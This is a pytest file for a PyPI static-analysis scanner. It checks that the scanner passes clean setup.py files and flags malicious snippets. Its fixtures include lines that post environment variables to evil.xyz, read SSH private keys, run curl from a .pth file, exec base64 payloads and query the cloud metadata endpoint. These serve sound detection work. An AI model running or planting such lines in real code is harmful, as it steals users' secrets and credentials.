"""Tests for PyPI static analysis scanner."""

import tempfile
from pathlib import Path

from app.core.config import Settings
from app.scanners.static_analysis_pypi import PyPIStaticAnalysisScanner
from app.schemas.package import PackageInfo


def _scanner() -> PyPIStaticAnalysisScanner:
    return PyPIStaticAnalysisScanner(Settings())


def _make_package() -> PackageInfo:
    return PackageInfo(name="test-pkg", version="1.0.0", registry="pypi")


def _write_temp(content: str, suffix: str = ".py") -> Path:
    p = Path(tempfile.mktemp(suffix=suffix))
    p.write_text(content)
    return p


async def test_pass_clean_setup():
    scanner = _scanner()
    f = _write_temp("from setuptools import setup\nsetup(name='safe')")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "pass"
    finally:
        f.unlink(missing_ok=True)


async def test_pass_cython_build():
    scanner = _scanner()
    f = _write_temp("from Cython.Build import cythonize\nsetup(ext_modules=cythonize('*.pyx'))")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "pass"  # False positive exclusion
    finally:
        f.unlink(missing_ok=True)


async def test_detect_env_exfil():
    scanner = _scanner()
    f = _write_temp("import os\ndata = dict(os.environ)\nrequests.post('https://evil.xyz', json=data)")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict in ("warn", "fail")
    finally:
        f.unlink(missing_ok=True)


async def test_detect_ssh_access():
    scanner = _scanner()
    f = _write_temp("with open('~/.ssh/id_rsa') as f: key = f.read()")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "fail"
    finally:
        f.unlink(missing_ok=True)


async def test_detect_pth_file():
    scanner = _scanner()
    f = _write_temp("import os; os.system('curl https://evil.com')", suffix=".pth")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "fail"
        assert ".pth" in result.details.lower()
    finally:
        f.unlink(missing_ok=True)


async def test_detect_base64_exec():
    scanner = _scanner()
    f = _write_temp("import base64\nexec(base64.b64decode('cHJpbnQoImhpIik='))")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "fail"
    finally:
        f.unlink(missing_ok=True)


async def test_detect_subprocess_curl():
    scanner = _scanner()
    f = _write_temp("import subprocess\nsubprocess.run(['curl', 'https://evil.xyz/steal'])")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict in ("warn", "fail")
    finally:
        f.unlink(missing_ok=True)


async def test_detect_cloud_metadata():
    scanner = _scanner()
    f = _write_temp("requests.get('http://169.254.169.254/latest/meta-data/')")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "fail"
    finally:
        f.unlink(missing_ok=True)
